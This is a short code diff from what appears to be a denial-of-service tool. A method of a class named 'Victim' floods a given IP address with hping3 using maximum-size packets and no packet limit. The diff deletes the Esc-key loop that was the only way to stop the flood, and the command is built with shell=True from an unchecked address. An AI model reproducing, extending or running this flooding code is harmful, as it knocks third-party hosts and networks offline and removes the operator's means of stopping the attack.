@@ -158,11 +158,7 @@ class Victim:
         hping_command = f"hping3 {ip_address} -d 65535 -c 0"
         process = subprocess.Popen(hping_command, shell=True)
 
-        while True:
-            if keyboard.is_pressed('esc'):
-                process.terminate()
-                break
-
+    
 if __name__ == '__main__':
     choice = "online"  # "offline"
     server_ip = '127.0.0.1'
